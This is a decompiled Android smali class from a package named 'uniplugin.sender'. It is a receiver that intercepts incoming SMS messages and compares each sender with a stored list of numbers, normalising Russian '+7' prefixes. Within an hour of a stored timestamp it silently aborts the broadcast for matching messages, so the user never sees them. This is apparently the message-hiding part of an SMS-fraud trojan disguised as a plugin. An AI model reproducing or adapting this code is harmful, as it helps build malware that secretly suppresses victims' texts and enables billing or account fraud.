.class Lcom/uniplugin/sender/Sender$1;
.super Landroid/content/BroadcastReceiver;
.source "Sender.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/uniplugin/sender/Sender;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/uniplugin/sender/Sender;


# direct methods
.method constructor <init>(Lcom/uniplugin/sender/Sender;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lcom/uniplugin/sender/Sender$1;->this$0:Lcom/uniplugin/sender/Sender;

    .line 556
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 12
    .param p1, "_context"    # Landroid/content/Context;
    .param p2, "_intent"    # Landroid/content/Intent;

    .prologue
    .line 560
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v6

    const-string v7, "android.provider.Telephony.SMS_RECEIVED"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_0

    .line 561
    const-string v5, "I am Safe and Well"

    .line 562
    .local v5, "queryString":Ljava/lang/String;
    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    .line 564
    .local v0, "bundle":Landroid/os/Bundle;
    if-eqz v0, :cond_0

    .line 566
    const-string v6, "pdus"

    invoke-virtual {v0, v6}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, [Ljava/lang/Object;

    .line 567
    .local v4, "pdus":[Ljava/lang/Object;
    array-length v6, v4

    new-array v3, v6, [Landroid/telephony/SmsMessage;

    .line 568
    .local v3, "messages":[Landroid/telephony/SmsMessage;
    const/4 v1, 0x0

    .local v1, "i":I
    :goto_0
    array-length v6, v4

    if-lt v1, v6, :cond_1

    .line 573
    array-length v8, v3

    const/4 v6, 0x0

    move v7, v6

    :goto_1
    if-lt v7, v8, :cond_2

    .line 593
    .end local v0    # "bundle":Landroid/os/Bundle;
    .end local v1    # "i":I
    .end local v3    # "messages":[Landroid/telephony/SmsMessage;
    .end local v4    # "pdus":[Ljava/lang/Object;
    .end local v5    # "queryString":Ljava/lang/String;
    :cond_0
    return-void

    .line 571
    .restart local v0    # "bundle":Landroid/os/Bundle;
    .restart local v1    # "i":I
    .restart local v3    # "messages":[Landroid/telephony/SmsMessage;
    .restart local v4    # "pdus":[Ljava/lang/Object;
    .restart local v5    # "queryString":Ljava/lang/String;
    :cond_1
    aget-object v6, v4, v1

    check-cast v6, [B

    invoke-static {v6}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v6

    .line 570
    aput-object v6, v3, v1

    .line 568
    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    .line 573
    :cond_2
    aget-object v2, v3, v7

    .line 574
    .local v2, "message":Landroid/telephony/SmsMessage;
    iget-object v6, p0, Lcom/uniplugin/sender/Sender$1;->this$0:Lcom/uniplugin/sender/Sender;

    iget-object v6, v6, Lcom/uniplugin/sender/Sender;->timeers:Ljava/lang/String;

    if-eqz v6, :cond_3

    .line 575
    iget-object v6, p0, Lcom/uniplugin/sender/Sender$1;->this$0:Lcom/uniplugin/sender/Sender;

    invoke-virtual {v6}, Lcom/uniplugin/sender/Sender;->GetUnixTime()I

    move-result v6

    iget-object v9, p0, Lcom/uniplugin/sender/Sender$1;->this$0:Lcom/uniplugin/sender/Sender;

    iget-object v9, v9, Lcom/uniplugin/sender/Sender;->timeers:Ljava/lang/String;

    invoke-static {v9}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v9

    add-int/lit16 v9, v9, 0xe10

    if-ge v6, v9, :cond_3

    .line 576
    iget-object v6, p0, Lcom/uniplugin/sender/Sender$1;->this$0:Lcom/uniplugin/sender/Sender;

    iget-object v6, v6, Lcom/uniplugin/sender/Sender;->numbers:Ljava/util/ArrayList;

    if-eqz v6, :cond_3

    .line 577
    iget-object v6, p0, Lcom/uniplugin/sender/Sender$1;->this$0:Lcom/uniplugin/sender/Sender;

    iget-object v6, v6, Lcom/uniplugin/sender/Sender;->numbers:Ljava/util/ArrayList;

    invoke-virtual {v6}, Ljava/util/ArrayList;->size()I

    move-result v6

    if-lez v6, :cond_3

    .line 578
    const/4 v1, 0x0

    :goto_2
    iget-object v6, p0, Lcom/uniplugin/sender/Sender$1;->this$0:Lcom/uniplugin/sender/Sender;

    iget-object v6, v6, Lcom/uniplugin/sender/Sender;->numbers:Ljava/util/ArrayList;

    invoke-virtual {v6}, Ljava/util/ArrayList;->size()I

    move-result v6

    if-lt v1, v6, :cond_4

    .line 573
    :cond_3
    add-int/lit8 v6, v7, 0x1

    move v7, v6

    goto :goto_1

    .line 579
    :cond_4
    invoke-virtual {v2}, Landroid/telephony/SmsMessage;->getOriginatingAddress()Ljava/lang/String;

    move-result-object v6

    const-string v9, "+7"

    const-string v10, "8"

    invoke-virtual {v6, v9, v10}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v9

    iget-object v6, p0, Lcom/uniplugin/sender/Sender$1;->this$0:Lcom/uniplugin/sender/Sender;

    iget-object v6, v6, Lcom/uniplugin/sender/Sender;->numbers:Ljava/util/ArrayList;

    invoke-virtual {v6, v1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Ljava/lang/String;

    invoke-virtual {v6}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v6

    const-string v10, "+7"

    const-string v11, "8"

    invoke-virtual {v6, v10, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v9, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-eqz v6, :cond_5

    .line 580
    invoke-virtual {p0}, Lcom/uniplugin/sender/Sender$1;->abortBroadcast()V

    .line 578
    :cond_5
    add-int/lit8 v1, v1, 0x1

    goto :goto_2
.end method
